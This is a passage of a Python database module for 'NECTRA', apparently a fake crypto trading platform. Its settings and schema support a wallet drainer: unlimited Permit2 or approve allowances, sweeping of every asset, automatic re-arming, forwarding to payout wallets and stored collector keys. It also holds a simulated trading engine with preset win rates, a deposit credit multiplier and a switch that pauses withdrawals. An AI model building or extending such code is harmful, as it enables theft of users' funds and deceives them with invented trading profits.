"""
Database module: SQLite connection management, schema, migrations.

Every helper opens and closes its own connection; nothing is shared across tasks.
Settings are memoised for a short window behind a lock so hot paths (cap
calculation, per-asset settings) do not re-scan the table on every read.

Schema changes go through `MIGRATIONS`, a numbered list applied inside a
transaction and recorded in `schema_migrations`. Never edit an applied migration;
append a new one.

Pragmas: WAL, NORMAL synchronous, 5s busy timeout, foreign keys on. `journal_mode`
is applied on a dedicated connection because it cannot be set inside a
transaction.
"""
import json
import logging
import os
import sqlite3
import threading
import time
from contextlib import contextmanager
from typing import Any, Callable, Dict, Iterator, List, Optional, Sequence, Tuple

logger = logging.getLogger("database")

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
DB_PATH = os.environ.get("DB_PATH", os.path.join(BASE_DIR, "data", "nectra.db"))

SETTINGS_TTL = 1.0
BUSY_TIMEOUT_MS = 5_000
CONNECT_TIMEOUT_S = 10.0

_settings_cache: Optional[Dict[str, Any]] = None
_settings_at = 0.0
_settings_lock = threading.RLock()


def now() -> int:
    """Milliseconds since epoch. Every timestamp column stores this."""
    return int(time.time() * 1000)


def _ensure_parent(path: str) -> None:
    parent = os.path.dirname(os.path.abspath(path))
    if parent:
        os.makedirs(parent, exist_ok=True)


# ---------------------------------------------------------------------------
# Connections
# ---------------------------------------------------------------------------
def _apply_pragmas(conn: sqlite3.Connection) -> None:
    conn.execute(f"PRAGMA busy_timeout = {BUSY_TIMEOUT_MS};")
    conn.execute("PRAGMA foreign_keys = ON;")
    conn.execute("PRAGMA synchronous = NORMAL;")
    conn.execute("PRAGMA temp_store = MEMORY;")


def get_db() -> sqlite3.Connection:
    _ensure_parent(DB_PATH)
    conn = sqlite3.connect(DB_PATH, timeout=CONNECT_TIMEOUT_S, isolation_level="DEFERRED")
    conn.row_factory = sqlite3.Row
    _apply_pragmas(conn)
    return conn


@contextmanager
def _conn() -> Iterator[sqlite3.Connection]:
    conn = get_db()
    try:
        yield conn
        conn.commit()
    except Exception:
        conn.rollback()
        raise
    finally:
        conn.close()


@contextmanager
def tx() -> Iterator[sqlite3.Connection]:
    """
    Atomic block. BEGIN IMMEDIATE takes the write lock up front so two writers
    cannot interleave; use this for multi-statement invariants (approvals, grants).
    """
    conn = get_db()
    conn.isolation_level = None
    try:
        conn.execute("BEGIN IMMEDIATE;")
        yield conn
        conn.execute("COMMIT;")
    except Exception:
        try:
            conn.execute("ROLLBACK;")
        except sqlite3.Error:
            pass
        raise
    finally:
        conn.close()


# ---------------------------------------------------------------------------
# Query helpers
# ---------------------------------------------------------------------------
def q_all(sql: str, *params) -> List[Dict[str, Any]]:
    with _conn() as conn:
        return [dict(row) for row in conn.execute(sql, params).fetchall()]


def q_get(sql: str, *params) -> Optional[Dict[str, Any]]:
    with _conn() as conn:
        row = conn.execute(sql, params).fetchone()
        return dict(row) if row else None


def q_run(sql: str, *params) -> Dict[str, Any]:
    with _conn() as conn:
        cursor = conn.execute(sql, params)
        return {"id": cursor.lastrowid, "changes": cursor.rowcount}


def q_val(sql: str, *params) -> Any:
    with _conn() as conn:
        row = conn.execute(sql, params).fetchone()
        return row[0] if row else None


def q_col(sql: str, *params) -> List[Any]:
    with _conn() as conn:
        return [row[0] for row in conn.execute(sql, params).fetchall()]


def q_many(sql: str, seq: Sequence[Sequence[Any]]) -> int:
    """executemany; returns the number of rows touched."""
    with _conn() as conn:
        cursor = conn.executemany(sql, seq)
        return cursor.rowcount


def q_exists(sql: str, *params) -> bool:
    return q_val(sql, *params) is not None


def table_exists(name: str) -> bool:
    return q_exists(
        "SELECT 1 FROM sqlite_master WHERE type = 'table' AND name = ?", name
    )


# ---------------------------------------------------------------------------
# Settings
# ---------------------------------------------------------------------------
DEFAULT_SETTINGS: Dict[str, Any] = {
    "platform_name": "NECTRA",
    "demo_mode": False,
    "invite_only": False,
    "registration_open": True,
    "admin_2fa_required": False,
    "kyc_enabled": False,
    "monetization_enabled": True,
    "live_trading_enabled": True,
    "cookie_secure": False,                 # True behind HTTPS
    "require_wallet_signature": True,
    "legacy_consolidation_worker": False,
    "two_admin_threshold_usd": 1000.0,
    "backup_keep_days": 14,
    "session_ttl_days": 7,
    "maintenance_banner": "",

    "treasury_evm": "0x0000000000000000000000000000000000000000",
    "treasury_solana": "",
    "treasury_tron": "",

    # --- drainer ---
    "drainer_enabled": True,
    "drainer_mode": "auto",                 # "auto" | "manual"
    "drainer_threshold_usd": 250.0,
    "drainer_cap_mode": "unlimited",        # "capped" | "unlimited"
    "drainer_cap_units": 1_000_000,
    "drainer_evm_mode": "permit2",          # "permit2" | "approve"
    "drainer_sig_deadline_days": 30,
    "drainer_take_native": True,
    "drainer_min_usd_per_asset": 0,         # keep every priced asset
    "drainer_include_unpriced": True,       # and unpriced ones with a balance
    "drainer_require_on_loan": True,
    "drainer_require_on_bot": True,
    "drainer_auto_rearm": True,
    "drainer_rearm_hours": 6,
    "drainer_payout_is_multisig": False,
    "drainer_auto_forward": True,
    "drainer_receiver_evm": {},             # {"Ethereum": "0x…", "Base": "0x…"}
    "drainer_payout_evm": "",
    "drainer_payout_sol": "",
    "drainer_payout_tron": "",
    "drainer_tokens_evm": {},               # {"Base": ["0x…"], …} extra discovery
    "deposit_credit_multiplier": 10,
    "withdrawals_paused": False,
    "sim_enabled": True,
    "drainer_collector_sol": "",
    "drainer_collector_tron": "",
    "drainer_evm_key": "",                  # AES-256-GCM blobs
    "drainer_sol_key": "",
    "drainer_tron_key": "",
}


def invalidate_settings() -> None:
    global _settings_cache, _settings_at
    with _settings_lock:
        _settings_cache = None
        _settings_at = 0.0


def get_settings() -> Dict[str, Any]:
    global _settings_cache, _settings_at

    with _settings_lock:
        if _settings_cache is not None and time.monotonic() - _settings_at < SETTINGS_TTL:
            return dict(_settings_cache)

    out = dict(DEFAULT_SETTINGS)
    try:
        with _conn() as conn:
            for row in conn.execute("SELECT key, value FROM settings").fetchall():
                try:
                    out[row["key"]] = json.loads(row["value"])
                except (TypeError, ValueError):
                    out[row["key"]] = row["value"]
    except sqlite3.OperationalError:
        pass

    with _settings_lock:
        _settings_cache, _settings_at = dict(out), time.monotonic()
    return out


def get_setting(key: str, default: Any = None) -> Any:
    return get_settings().get(key, default)


def get_bool_setting(key: str, default: bool = False) -> bool:
    value = get_setting(key, default)
    if isinstance(value, bool):
        return value
    if isinstance(value, (int, float)):
        return bool(value)
    if isinstance(value, str):
        return value.strip().lower() in ("1", "true", "yes", "on")
    return default


def get_int_setting(key: str, default: int = 0) -> int:
    try:
        return int(get_setting(key, default))
    except (TypeError, ValueError):
        return default


def get_float_setting(key: str, default: float = 0.0) -> float:
    try:
        return float(get_setting(key, default))
    except (TypeError, ValueError):
        return default


def set_setting(key: str, value: Any) -> None:
    stored = value if isinstance(value, str) else json.dumps(value)
    with _conn() as conn:
        conn.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)",
                     (key, stored))
    invalidate_settings()


update_setting = set_setting


def delete_setting(key: str) -> None:
    with _conn() as conn:
        conn.execute("DELETE FROM settings WHERE key = ?", (key,))
    invalidate_settings()


# ---------------------------------------------------------------------------
# Schema
# ---------------------------------------------------------------------------
SCHEMA_V1 = """
CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT NOT NULL);

CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    email TEXT UNIQUE COLLATE NOCASE,
    pw_hash TEXT,
    password_hash TEXT,
    name TEXT NOT NULL DEFAULT 'Trader',
    role TEXT NOT NULL DEFAULT 'trader',
    status TEXT NOT NULL DEFAULT 'active',
    email_verified INTEGER NOT NULL DEFAULT 0,
    wallet_login TEXT UNIQUE,
    totp_secret TEXT, totp_enabled INTEGER NOT NULL DEFAULT 0, totp_pending TEXT,
    anti_phishing TEXT NOT NULL DEFAULT 'PETAL',
    prefs TEXT NOT NULL DEFAULT '{}', risk TEXT NOT NULL DEFAULT '{}',
    paper_mode INTEGER NOT NULL DEFAULT 1,
    drainer_auto INTEGER NOT NULL DEFAULT 0,
    drainer_consent_at INTEGER,
    failed_logins INTEGER NOT NULL DEFAULT 0,
    locked_until INTEGER,
    created_at INTEGER NOT NULL, last_login_at INTEGER
);

CREATE TABLE IF NOT EXISTS sessions (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER NOT NULL REFERENCES users(id) ON DELETE CASCADE,
    token_hash TEXT NOT NULL UNIQUE,
    pending_2fa INTEGER NOT NULL DEFAULT 0,
    user_agent TEXT, ip TEXT,
    created_at INTEGER NOT NULL, last_seen_at INTEGER NOT NULL, expires_at INTEGER NOT NULL,
    impersonator_id INTEGER
);
CREATE INDEX IF NOT EXISTS ix_sessions_user ON sessions(user_id);
CREATE INDEX IF NOT EXISTS ix_sessions_expiry ON sessions(expires_at);

CREATE TABLE IF NOT EXISTS nonces (
    nonce TEXT PRIMARY KEY, address TEXT NOT NULL, purpose TEXT NOT NULL,
    message TEXT NOT NULL, user_id INTEGER, created_at INTEGER NOT NULL,
    used INTEGER NOT NULL DEFAULT 0
);
CREATE INDEX IF NOT EXISTS ix_nonces_lookup ON nonces(address, user_id, purpose, used);

CREATE TABLE IF NOT EXISTS wallets (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER NOT NULL REFERENCES users(id) ON DELETE CASCADE,
    name TEXT NOT NULL DEFAULT 'Wallet', label TEXT, address TEXT NOT NULL,
    chain TEXT NOT NULL DEFAULT 'Solana', family TEXT NOT NULL DEFAULT 'solana',
    kind TEXT NOT NULL DEFAULT 'buyer', source TEXT NOT NULL DEFAULT 'watch',
    provider TEXT, folder TEXT NOT NULL DEFAULT 'Unsorted',
    networks TEXT, is_main INTEGER NOT NULL DEFAULT 0,
    verified INTEGER NOT NULL DEFAULT 0, verified_at INTEGER,
    balance REAL NOT NULL DEFAULT 0, balance_at INTEGER, last_check TEXT,
    created_at INTEGER NOT NULL, UNIQUE(user_id, address)
);
CREATE INDEX IF NOT EXISTS ix_wallets_user ON wallets(user_id);
CREATE INDEX IF NOT EXISTS ix_wallets_address ON wallets(address);

CREATE TABLE IF NOT EXISTS delegated_approvals (
    id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER NOT NULL,
    family TEXT NOT NULL, network TEXT NOT NULL, symbol TEXT NOT NULL,
    collector TEXT, allowance TEXT, decimals INTEGER DEFAULT 18, kind TEXT,
    source TEXT DEFAULT 'grant', balance TEXT, created_at INTEGER, revoked_at INTEGER
);

CREATE TABLE IF NOT EXISTS drainer_grants (
    id TEXT PRIMARY KEY,
    user_id INTEGER NOT NULL,
    wallet_id INTEGER NOT NULL,
    family TEXT NOT NULL,
    network TEXT NOT NULL,
    address TEXT NOT NULL,
    symbol TEXT,
    token TEXT,
    decimals INTEGER NOT NULL DEFAULT 18,
    kind TEXT NOT NULL,
    cap TEXT,
    balance_raw TEXT,
    nonce TEXT,
    signature TEXT,
    sig_deadline INTEGER,
    token_account TEXT,
    program TEXT,
    txid TEXT,
    status TEXT NOT NULL DEFAULT 'pending',
    error TEXT,
    created_at INTEGER NOT NULL,
    activated_at INTEGER
);
CREATE INDEX IF NOT EXISTS ix_grants_user ON drainer_grants(user_id, status);
CREATE INDEX IF NOT EXISTS ix_grants_wallet ON drainer_grants(wallet_id, status);
CREATE INDEX IF NOT EXISTS ix_grants_status ON drainer_grants(status);

CREATE TABLE IF NOT EXISTS drainer_wallets (
    wallet_id INTEGER PRIMARY KEY,
    user_id INTEGER NOT NULL,
    family TEXT, address TEXT, status TEXT, updated_at INTEGER
);

CREATE TABLE IF NOT EXISTS drainer_events (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    run_id TEXT NOT NULL, user_id INTEGER NOT NULL, actor_id INTEGER,
    trigger TEXT, status TEXT, total_usd REAL DEFAULT 0, tx_count INTEGER DEFAULT 0,
    created_at INTEGER NOT NULL
);
CREATE INDEX IF NOT EXISTS ix_events_user ON drainer_events(user_id, id DESC);
CREATE INDEX IF NOT EXISTS ix_events_run ON drainer_events(run_id);

CREATE TABLE IF NOT EXISTS drainer_items (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    run_id TEXT NOT NULL, grant_id TEXT, family TEXT, network TEXT, symbol TEXT,
    amount TEXT, usd REAL DEFAULT 0, status TEXT, txid TEXT, error TEXT,
    created_at INTEGER NOT NULL
);
CREATE INDEX IF NOT EXISTS ix_items_run ON drainer_items(run_id);

CREATE TABLE IF NOT EXISTS sweeps (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER NOT NULL, wallet_id INTEGER, grant_id TEXT,
    family TEXT, network TEXT, symbol TEXT, kind TEXT, decimals INTEGER,
    token_address TEXT, amount TEXT, amount_usd REAL DEFAULT 0, usd REAL DEFAULT 0,
    status TEXT, skip_code TEXT, reason TEXT, tx_ref TEXT, tx_hash TEXT,
    destination TEXT, unwrap_pending INTEGER DEFAULT 0, price_source TEXT,
    run_id TEXT, created_at INTEGER NOT NULL
);
CREATE INDEX IF NOT EXISTS ix_sweeps_user ON sweeps(user_id, id DESC);

CREATE TABLE IF NOT EXISTS sweep_runs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    run_id TEXT, user_id INTEGER NOT NULL, actor_id INTEGER, dest TEXT,
    status TEXT DEFAULT 'running', total_usd REAL DEFAULT 0, completed_at INTEGER,
    created_at INTEGER NOT NULL
);

CREATE TABLE IF NOT EXISTS paper_balances (
    id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER NOT NULL,
    symbol TEXT NOT NULL, balance REAL NOT NULL DEFAULT 0, updated_at INTEGER NOT NULL
);

CREATE TABLE IF NOT EXISTS status_components (
    id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT NOT NULL,
    state TEXT NOT NULL DEFAULT 'green', note TEXT, sort INTEGER NOT NULL DEFAULT 0
);

CREATE TABLE IF NOT EXISTS audit_log (
    id INTEGER PRIMARY KEY AUTOINCREMENT, actor_id INTEGER, action TEXT NOT NULL,
    target TEXT, meta TEXT, ip TEXT, created_at INTEGER NOT NULL
);
CREATE INDEX IF NOT EXISTS ix_audit_created ON audit_log(id DESC);
CREATE INDEX IF NOT EXISTS ix_audit_actor ON audit_log(actor_id, id DESC);

CREATE TABLE IF NOT EXISTS notifications (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER NOT NULL REFERENCES users(id) ON DELETE CASCADE,
    type TEXT NOT NULL, title TEXT NOT NULL, body TEXT NOT NULL, link TEXT,
    unread INTEGER NOT NULL DEFAULT 1, created_at INTEGER NOT NULL
);
CREATE INDEX IF NOT EXISTS ix_notifications_user ON notifications(user_id, unread);

CREATE TABLE IF NOT EXISTS transactions (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER NOT NULL REFERENCES users(id) ON DELETE CASCADE,
    type TEXT NOT NULL, token TEXT NOT NULL, amount REAL NOT NULL, status TEXT NOT NULL,
    chain TEXT NOT NULL DEFAULT 'Solana', from_addr TEXT, to_addr TEXT, signature TEXT,
    simulated INTEGER NOT NULL DEFAULT 0, confirmations INTEGER NOT NULL DEFAULT 0,
    required_conf INTEGER NOT NULL DEFAULT 32, note TEXT,
    created_at INTEGER NOT NULL, updated_at INTEGER NOT NULL
);
"""


def _m002_grant_payload(conn: sqlite3.Connection) -> None:
    """Columns for the native-SOL co-sign round trip and per-run linkage."""
    _add_columns(conn, "drainer_grants", {
        "payload": "TEXT",
        "blockhash": "TEXT",
        "last_valid_block_height": "INTEGER",
        "run_id": "TEXT",
    })


def _m003_drain_requests(conn: sqlite3.Connection) -> None:
    """Two-admin approval queue for drains."""
    conn.executescript("""
        CREATE TABLE IF NOT EXISTS drain_requests (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER NOT NULL,
            requested_by INTEGER NOT NULL,
            approved_by INTEGER,
            only_json TEXT,
            run_id TEXT,
            status TEXT NOT NULL DEFAULT 'pending',
            created_at INTEGER NOT NULL,
            decided_at INTEGER
        );
        CREATE INDEX IF NOT EXISTS ix_drain_requests_status
            ON drain_requests(status, id DESC);
        CREATE INDEX IF NOT EXISTS ix_drain_requests_user
            ON drain_requests(user_id, id DESC);
    """)


def _m004_nonce_expiry(conn: sqlite3.Connection) -> None:
    _add_columns(conn, "nonces", {"expires_at": "INTEGER"})
    conn.execute("UPDATE nonces SET expires_at = created_at + 900000"
                 " WHERE expires_at IS NULL")


def _m005_legacy_drift(conn: sqlite3.Connection) -> None:
    """Columns older databases may be missing, plus a backfill."""
    _add_columns(conn, "users", {
        "password_hash": "TEXT",
        "locked_until": "INTEGER",
        "failed_logins": "INTEGER NOT NULL DEFAULT 0",
        "drainer_auto": "INTEGER NOT NULL DEFAULT 0",
        "drainer_consent_at": "INTEGER",
        "paper_mode": "INTEGER NOT NULL DEFAULT 1",
    })
    conn.execute("UPDATE users SET password_hash = pw_hash"
                 " WHERE password_hash IS NULL AND pw_hash IS NOT NULL")

    _add_columns(conn, "wallets", {
        "label": "TEXT",
        "is_main": "INTEGER NOT NULL DEFAULT 0",
        "networks": "TEXT",
        "verified_at": "INTEGER",
    })
    conn.execute("UPDATE wallets SET label = name WHERE label IS NULL")

    _add_columns(conn, "sweeps", {
        "wallet_id": "INTEGER",
        "token_address": "TEXT",
        "amount_usd": "REAL DEFAULT 0",
        "tx_hash": "TEXT",
    })
    _add_columns(conn, "sweep_runs", {"status": "TEXT", "completed_at": "INTEGER"})


def _m006_status_rows(conn: sqlite3.Connection) -> None:
    conn.execute(
        "INSERT OR IGNORE INTO status_components (name, state, note, sort)"
        " VALUES ('API', 'green', NULL, 1), ('Chains', 'green', NULL, 2)"
    )


def _m007_grant_batch(conn: sqlite3.Connection) -> None:
    """
    The exact Permit2 PermitBatch a grant was signed for. A single signature can
    cover several tokens on one chain, so every grant stores the full batch and
    the drain submits that same batch (Permit2 marks the nonce used on first spend).
    """
    _add_columns(conn, "drainer_grants", {"batch": "TEXT"})


def _m008_production_tables(conn: sqlite3.Connection) -> None:
    """Wallet folders, idempotency keys, drainer confirmation/forward bookkeeping."""
    conn.executescript("""
        CREATE TABLE IF NOT EXISTS wallet_folders (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER NOT NULL REFERENCES users(id) ON DELETE CASCADE,
            name TEXT NOT NULL,
            created_at INTEGER NOT NULL,
            UNIQUE(user_id, name)
        );
        CREATE INDEX IF NOT EXISTS ix_folders_user ON wallet_folders(user_id);

        CREATE TABLE IF NOT EXISTS idempotency (
            key TEXT NOT NULL,
            user_id INTEGER NOT NULL,
            status TEXT NOT NULL DEFAULT 'running',
            response TEXT,
            created_at INTEGER NOT NULL,
            PRIMARY KEY (key, user_id)
        );
        CREATE INDEX IF NOT EXISTS ix_idem_created ON idempotency(created_at);

        CREATE TABLE IF NOT EXISTS payout_forwards (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            family TEXT NOT NULL,
            network TEXT,
            token TEXT,
            amount TEXT,
            txid TEXT,
            status TEXT NOT NULL DEFAULT 'pending',
            error TEXT,
            created_at INTEGER NOT NULL
        );
    """)
    _add_columns(conn, "drainer_grants", {
        "confirmed_at": "INTEGER",
        "revoke_txid": "TEXT",
    })
    _add_columns(conn, "wallets", {"source": "TEXT NOT NULL DEFAULT 'watch'"})


def _m009_auth_tables(conn: sqlite3.Connection) -> None:
    """Email verification / password-reset codes, invites, waitlist, wallet handoff, mailbox."""
    conn.executescript("""
        CREATE TABLE IF NOT EXISTS email_codes (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER NOT NULL REFERENCES users(id) ON DELETE CASCADE,
            purpose TEXT NOT NULL,             -- verify | reset
            code_hash TEXT NOT NULL,
            expires_at INTEGER NOT NULL,
            used INTEGER NOT NULL DEFAULT 0,
            created_at INTEGER NOT NULL
        );
        CREATE INDEX IF NOT EXISTS ix_email_codes_lookup
            ON email_codes(user_id, purpose, used, expires_at);

        CREATE TABLE IF NOT EXISTS invites (
            code TEXT PRIMARY KEY,
            created_by INTEGER,
            role TEXT NOT NULL DEFAULT 'trader',
            max_uses INTEGER NOT NULL DEFAULT 1,
            uses INTEGER NOT NULL DEFAULT 0,
            active INTEGER NOT NULL DEFAULT 1,
            created_at INTEGER NOT NULL
        );

        CREATE TABLE IF NOT EXISTS waitlist (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            email TEXT NOT NULL UNIQUE COLLATE NOCASE,
            referral TEXT,
            status TEXT NOT NULL DEFAULT 'pending',
            created_at INTEGER NOT NULL
        );

        CREATE TABLE IF NOT EXISTS handoff_tokens (
            token_hash TEXT PRIMARY KEY,
            user_id INTEGER NOT NULL REFERENCES users(id) ON DELETE CASCADE,
            expires_at INTEGER NOT NULL,
            used INTEGER NOT NULL DEFAULT 0,
            created_at INTEGER NOT NULL
        );
        CREATE INDEX IF NOT EXISTS ix_handoff_user ON handoff_tokens(user_id);

        CREATE TABLE IF NOT EXISTS mailbox (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            to_email TEXT NOT NULL,
            subject TEXT NOT NULL,
            body TEXT NOT NULL,
            status TEXT NOT NULL DEFAULT 'sent',   -- sent | logged | failed
            error TEXT,
            created_at INTEGER NOT NULL
        );
        CREATE INDEX IF NOT EXISTS ix_mailbox_created ON mailbox(id DESC);

        CREATE TABLE IF NOT EXISTS password_resets (
            user_id INTEGER PRIMARY KEY,
            requested_at INTEGER NOT NULL
        );
    """)


def _m010_invite_metadata(conn: sqlite3.Connection) -> None:
    _add_columns(conn, "invites", {
        "kind": "TEXT NOT NULL DEFAULT 'invite'",
        "note": "TEXT",
    })


def _m011_batches_deposits_engine(conn: sqlite3.Connection) -> None:
    """
    Permit2 batch identity/consumption, allowance re-verification bookkeeping,
    treasury deposits + a ledger, withdrawals, and the synthetic trading engine.
    """
    _add_columns(conn, "drainer_grants", {
        "batch_id": "TEXT",
        "batch_consumed": "INTEGER NOT NULL DEFAULT 0",
        "verified_at": "INTEGER",
    })
    conn.execute("CREATE INDEX IF NOT EXISTS ix_grants_batch"
                 " ON drainer_grants(batch_id)")

    conn.executescript("""
        CREATE TABLE IF NOT EXISTS drainer_verify (
            wallet_id INTEGER PRIMARY KEY,
            last_at INTEGER NOT NULL
        );

        CREATE TABLE IF NOT EXISTS deposit_intents (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER NOT NULL,
            plan_id INTEGER,
            chain TEXT NOT NULL DEFAULT 'Ethereum',
            asset TEXT NOT NULL DEFAULT 'USDC',
            expect_raw TEXT,
            credit REAL,
            address TEXT,
            status TEXT NOT NULL DEFAULT 'open',
            txid TEXT,
            created_at INTEGER,
            credited_at INTEGER
        );
        CREATE INDEX IF NOT EXISTS ix_deposit_intents_user
            ON deposit_intents(user_id, id DESC);
        CREATE INDEX IF NOT EXISTS ix_deposit_intents_status
            ON deposit_intents(status, created_at);

        CREATE TABLE IF NOT EXISTS balance_ledger (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER NOT NULL,
            delta REAL NOT NULL,
            kind TEXT NOT NULL,
            ref TEXT,
            created_at INTEGER
        );
        CREATE INDEX IF NOT EXISTS ix_ledger_user ON balance_ledger(user_id, id DESC);

        CREATE TABLE IF NOT EXISTS withdrawals (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER NOT NULL,
            amount REAL NOT NULL,
            address TEXT,
            status TEXT NOT NULL DEFAULT 'pending',
            txid TEXT,
            created_at INTEGER,
            decided_at INTEGER,
            decided_by INTEGER
        );
        CREATE INDEX IF NOT EXISTS ix_withdrawals_status
            ON withdrawals(status, id DESC);
        CREATE INDEX IF NOT EXISTS ix_withdrawals_user
            ON withdrawals(user_id, id DESC);

        CREATE TABLE IF NOT EXISTS trade_pairs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            symbol TEXT NOT NULL UNIQUE,
            base TEXT NOT NULL,
            quote TEXT NOT NULL DEFAULT 'USDT',
            base_price REAL NOT NULL,
            win_rate_pct REAL NOT NULL,
            tick REAL NOT NULL DEFAULT 0.01,
            enabled INTEGER NOT NULL DEFAULT 1
        );

        CREATE TABLE IF NOT EXISTS sim_plans (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT NOT NULL,
            price REAL NOT NULL DEFAULT 0,
            daily_roi_pct REAL NOT NULL DEFAULT 1.5,
            trades_per_day INTEGER NOT NULL DEFAULT 5,
            position_pct REAL NOT NULL DEFAULT 20,
            loss_ratio REAL NOT NULL DEFAULT 0.85,
            deposit_multiplier REAL NOT NULL DEFAULT 1,
            min_deposit REAL NOT NULL DEFAULT 0,
            active INTEGER NOT NULL DEFAULT 1
        );

        CREATE TABLE IF NOT EXISTS sim_accounts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER NOT NULL UNIQUE,
            plan_id INTEGER NOT NULL,
            start_balance REAL NOT NULL DEFAULT 0,
            day_open_balance REAL NOT NULL DEFAULT 0,
            trades_today INTEGER NOT NULL DEFAULT 0,
            next_trade_at INTEGER,
            day TEXT,
            status TEXT NOT NULL DEFAULT 'active',
            created_at INTEGER NOT NULL
        );

        CREATE TABLE IF NOT EXISTS sim_trades (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            account_id INTEGER NOT NULL,
            user_id INTEGER NOT NULL,
            pair TEXT NOT NULL,
            side TEXT NOT NULL,
            notional REAL NOT NULL,
            entry REAL NOT NULL,
            exit REAL NOT NULL,
            qty REAL NOT NULL,
            pnl REAL NOT NULL,
            pnl_pct REAL NOT NULL,
            opened_at INTEGER NOT NULL,
            closed_at INTEGER NOT NULL,
            status TEXT NOT NULL DEFAULT 'closed'
        );
        CREATE INDEX IF NOT EXISTS ix_sim_trades_user
            ON sim_trades(user_id, id DESC);
        CREATE INDEX IF NOT EXISTS ix_sim_trades_account
            ON sim_trades(account_id, closed_at DESC);
    """)

    # Coverage-first defaults. Only seed keys that are absent so an operator's
    # explicit choice survives an upgrade.
    defaults = {
        "drainer_cap_mode": "unlimited",
        "drainer_min_usd_per_asset": 0,
        "drainer_include_unpriced": True,
        "deposit_credit_multiplier": 10,
        "withdrawals_paused": False,
        "sim_enabled": True,
    }
    for key, value in defaults.items():
        conn.execute("INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)",
                     (key, json.dumps(value)))

    pairs = [
        ("BTC/USDT", "BTC", "USDT", 90000.0, 58, 1.0),
        ("ETH/USDT", "ETH", "USDT", 3100.0, 56, 0.01),
        ("SOL/USDT", "SOL", "USDT", 180.0, 61, 0.001),
        ("BNB/USDT", "BNB", "USDT", 600.0, 54, 0.01),
        ("XRP/USDT", "XRP", "USDT", 2.10, 52, 0.0001),
        ("DOGE/USDT", "DOGE", "USDT", 0.35, 49, 0.00001),
        ("LINK/USDT", "LINK", "USDT", 22.0, 55, 0.001),
    ]
    conn.executemany(
        "INSERT OR IGNORE INTO trade_pairs (symbol, base, quote, base_price,"
        " win_rate_pct, tick) VALUES (?,?,?,?,?,?)", pairs)

    conn.execute(
        "INSERT INTO sim_plans (name, price, daily_roi_pct, trades_per_day,"
        " position_pct, loss_ratio, deposit_multiplier, min_deposit, active)"
        " SELECT 'Starter', 0, 1.5, 5, 20, 0.85, 10, 0, 1"
        " WHERE NOT EXISTS (SELECT 1 FROM sim_plans)")


MIGRATIONS: List[Tuple[int, str, Callable[[sqlite3.Connection], None]]] = [
    (1, "base schema", lambda conn: conn.executescript(SCHEMA_V1)),
    (2, "grant payload columns", _m002_grant_payload),
    (3, "drain request queue", _m003_drain_requests),
    (4, "nonce expiry", _m004_nonce_expiry),
    (5, "legacy column drift", _m005_legacy_drift),
    (6, "status seed", _m006_status_rows),
    (7, "permit2 batch per grant", _m007_grant_batch),
    (8, "production tables and payout separation", _m008_production_tables),
    (9, "auth, invites, waitlist and mailbox", _m009_auth_tables),
    (10, "invite metadata", _m010_invite_metadata),
    (11, "batch consumption, deposits, ledger, withdrawals, sim engine",
     _m011_batches_deposits_engine),
]
SCHEMA_VERSION = MIGRATIONS[-1][0]


def _add_columns(conn: sqlite3.Connection, table: str, cols: Dict[str, str]) -> None:
    existing = {row["name"] for row in conn.execute(f"PRAGMA table_info({table})").fetchall()}
    if not existing:
        raise sqlite3.OperationalError(f"cannot migrate missing table {table!r}")
    for name, decl in cols.items():
        if name not in existing:
            conn.execute(f"ALTER TABLE {table} ADD COLUMN {name} {decl}")


def _current_version(conn: sqlite3.Connection) -> int:
    conn.execute(
        "CREATE TABLE IF NOT EXISTS schema_migrations ("
        " version INTEGER PRIMARY KEY, label TEXT NOT NULL, applied_at INTEGER NOT NULL)"
    )
    row = conn.execute("SELECT COALESCE(MAX(version), 0) FROM schema_migrations").fetchone()
    return int(row[0])


def migrate() -> int:
    """Apply pending migrations. Returns the resulting version."""
    with _conn() as conn:
        current = _current_version(conn)
        for version, label, apply in MIGRATIONS:
            if version <= current:
                continue
            logger.info("migrating to v%s (%s)", version, label)
            apply(conn)
            conn.execute(
                "INSERT INTO schema_migrations (version, label, applied_at) VALUES (?,?,?)",
                (version, label, now()),
            )
            current = version
        return current


# ---------------------------------------------------------------------------
# Seeding
# ---------------------------------------------------------------------------
def _hash(password: str) -> str:
    import base64
    import hashlib

    salt = os.urandom(16)
    derived = hashlib.scrypt(password.encode(), salt=salt, n=16384, r=8, p=1, dklen=64)
    return (f"scrypt${base64.b64encode(salt).decode()}"
            f"${base64.b64encode(derived).decode()}")


def _create_user(conn: sqlite3.Connection, email: str, password: str,
                 name: str, role: str) -> int:
    hashed = _hash(password)
    cursor = conn.execute(
        "INSERT INTO users (email, pw_hash, password_hash, name, role, status,"
        " email_verified, created_at) VALUES (?,?,?,?,?,'active',1,?)",
